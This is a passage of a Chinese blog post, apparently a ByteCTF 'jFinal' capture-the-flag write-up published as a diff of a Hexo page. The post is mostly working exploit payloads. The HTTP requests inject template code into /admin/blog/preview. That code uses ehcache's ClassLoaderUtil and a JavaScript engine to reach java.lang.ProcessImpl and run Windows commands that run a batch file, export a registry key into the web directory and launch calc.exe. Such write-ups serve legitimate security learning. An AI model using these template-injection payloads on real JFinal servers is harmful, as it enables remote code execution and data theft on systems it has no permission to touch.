class="built_in">Array</span>.newInstance(java.lang.<span class="built_in">String</span>.<span class="keyword">class</span>,<span class="number">3</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">0</span>,<span class="string">&#x27;cmd.exe&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">1</span>,<span class="string">&#x27;/c&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">2</span>,<span class="string">&#x27;C:/Users/ctf/jfinal-blog/jfinal-blog/webapp/1.bat&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> m = pclz.getDeclaredMethod(<span class="string">&#x27;start&#x27;</span>, clz, java.util.<span class="built_in">Map</span>.<span class="keyword">class</span>, java.lang.<span class="built_in">String</span>.<span class="keyword">class</span>, rclz, bclz);</span></span><br><span class="line"><span class="language-livescript">m.setAccessible(<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-livescript"><span class="built_in">print</span>(m);</span></span><br><span class="line"><span class="language-livescript">m.invoke(<span class="literal">null</span>,cmd,  <span class="literal">null</span>, <span class="literal">null</span>,<span class="literal">null</span> ,<span class="literal">false</span>);</span></span><br><span class="line"><span class="language-livescript"><span class="string">&quot;)</span></span></span><br><span class="line"><span class="string"><span class="language-livescript">#((net.sf.ehcache.util.ClassLoaderUtil::createNewInstance(&quot;</span>javax.script.ScriptEngineManager<span class="string">&quot;)).getEngineByExtension(&#x27;js&#x27;).eval(poc))</span></span></span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>http://url/1.reg</code> 下载reg文件即可得到flag  bytectf{Exploit_JVM_ToBypassSandbox}</p>
+<p>这里不用vps远程下载，直接导出到web目录也行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Array.set(cmd,<span class="number">0</span>,<span class="string">&#x27;cmd.exe&#x27;</span>);</span><br><span class="line">java.lang.reflect.Array.set(cmd,<span class="number">1</span>,<span class="string">&#x27;/c&#x27;</span>);</span><br><span class="line">java.lang.reflect.Array.set(cmd,<span class="number">2</span>,<span class="string">&#x27;reg&#x27;</span>);</span><br><span class="line">java.lang.reflect.Array.set(cmd,<span class="number">3</span>,<span class="string">&#x27;export&#x27;</span>);</span><br><span class="line">java.lang.reflect.Array.set(cmd,<span class="number">4</span>,<span class="string">&#x27;HKEY_CURRENT_USER\ByteCTF&#x27;</span>);</span><br><span class="line">java.lang.reflect.Array.set(cmd,<span class="number">5</span>,<span class="string">&#x27;C:/Users/ctf/jfinal-blog/jfinal-blog/webapp/1.reg&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>修改为本地弹计算器：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/blog/preview</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.43.252:30000</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>785</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.43.252:30000</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.43.252:30000/admin/blog/add</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sessionId=f0b56f4cce334eda98d7d243da59d538</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-livescript">blog.title=$&#123;&#123;<span class="number">123</span>&#125;&#125;&amp;blog.content=<span class="comment">#set(poc=&quot;</span></span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> clz = Java.type(<span class="string">&#x27;java.lang.String[]&#x27;</span>).<span class="keyword">class</span>;</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> rclz = Java.type(<span class="string">&#x27;java.lang.ProcessBuilder.Redirect[]&#x27;</span>).<span class="keyword">class</span>;</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> bclz = Java.type(<span class="string">&#x27;boolean&#x27;</span>).<span class="keyword">class</span>;</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> pclz = Java.type(<span class="string">&#x27;java.lang.ProcessImpl&#x27;</span>).<span class="keyword">class</span>;</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> cmd = java.lang.reflect.<span class="built_in">Array</span>.newInstance(java.lang.<span class="built_in">String</span>.<span class="keyword">class</span>,<span class="number">3</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">0</span>,<span class="string">&#x27;cmd&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">1</span>,<span class="string">&#x27;/c&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript">java.lang.reflect.<span class="built_in">Array</span>.set(cmd,<span class="number">2</span>,<span class="string">&#x27;calc.exe&#x27;</span>);</span></span><br><span class="line"><span class="language-livescript"><span class="keyword">var</span> m = pclz.getDeclaredMethod(<span class="string">&#x27;start&#x27;</span>, clz, java.util.<span class="built_in">Map</span>.<span class="keyword">class</span>, java.lang.<span class="built_in">String</span>.<span class="keyword">class</span>, rclz, bclz);</span></span><br><span class="line"><span class="language-livescript">m.setAccessible(<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-livescript"><span class="built_in">print</span>(m);</span></span><br><span class="line"><span class="language-livescript">m.invoke(<span class="literal">null</span>,cmd,  <span class="literal">null</span>, <span class="literal">null</span>,<span class="literal">null</span> ,<span class="literal">false</span>);</span></span><br><span class="line"><span class="language-livescript"><span class="string">&quot;)</span></span></span><br><span class="line"><span class="string"><span class="language-livescript">#((net.sf.ehcache.util.ClassLoaderUtil::createNewInstance(&quot;</span>javax.script.ScriptEngineManager<span class="string">&quot;)).getEngineByExtension(&#x27;js&#x27;).eval(poc))</span></span></span><br></pre></td></tr></table></figure>
+
+<p>如果不换行，触发log则会记录完整的payload，会让别人蹭车:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/blog/preview</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.43.252:30000</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>760</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.43.252:30000</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.43.252:30000/admin/blog/add</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sessionId=f0b56f4cce334eda98d7d243da59d538</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">blog.<span class="attribute">title</span>=<span class="variable">$&#123;&#123;123&#125;</span>&#125;&amp;blog.<span class="attribute">content</span>=#set(poc=&quot;var clz = Java.type(<span class="string">&#x27;java.lang.String[]&#x27;</span>).class;var rclz = Java.type(<span class="string">&#x27;java.lang.ProcessBuilder.Redirect[]&#x27;</span>).class;var bclz = Java.type(<span class="string">&#x27;boolean&#x27;</span>).class;var pclz = Java.type(<span class="string">&#x27;java.lang.ProcessImpl&#x27;</span>).class;var cmd = java.lang.reflect.Array.newInstance(java.lang.String.class,3);java.lang.reflect.Array.<span class="built_in">set</span>(cmd,0,<span class="string">&#x27;cmd&#x27;</span>);java.lang.reflect.Array.<span class="built_in">set</span>(cmd,1,<span class="string">&#x27;/c&#x27;</span>);java.lang.reflect.Array.<span class="built_in">set</span>(cmd,2,<span class="string">&#x27;calc.exe&#x27;</span>);var m = pclz.getDeclaredMethod(<span class="string">&#x27;start&#x27;</span>, clz, java.util.Map.class, java.lang.String.class, rclz, bclz);m.setAccessible(<span class="literal">true</span>);<span class="built_in">print</span>(m);m.invoke(<span class="literal">null</span>,cmd,  <span class="literal">null</span>, <span class="literal">null</span>,<span class="literal">null</span> ,<span class="literal">false</span>)<span class="string">&#x27;;&quot;)</span></span></span><br><span class="line"><span class="string"><span class="language-routeros">#((net.sf.ehcache.util.ClassLoaderUtil::createNewInstance(&quot;javax.script.ScriptEngineManager&quot;)).getEngineByExtension(&#x27;</span>js<span class="string">&#x27;).eval(poc))</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ByteCTF-jFinal"><span class="toc-number">1.</span> <span class="toc-text">ByteCTF jFinal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%85%8D%E7%BD%AE%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">1.配置本地环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%9A"><span class="toc-number">3.</span> <span class="toc-text">2.题目环境打通</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&text=ByteCTF-jFinal"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&title=ByteCTF-jFinal"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&is_video=false&description=ByteCTF-jFinal"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ByteCTF-jFinal&body=Check out this article: https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&title=ByteCTF-jFinal"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&title=ByteCTF-jFinal"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&title=ByteCTF-jFinal"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&title=ByteCTF-jFinal"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&name=ByteCTF-jFinal&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yenannn.github.io/2022/03/25/ByteCTF-jFinal/&t=ByteCTF-jFinal"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    Yenan
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
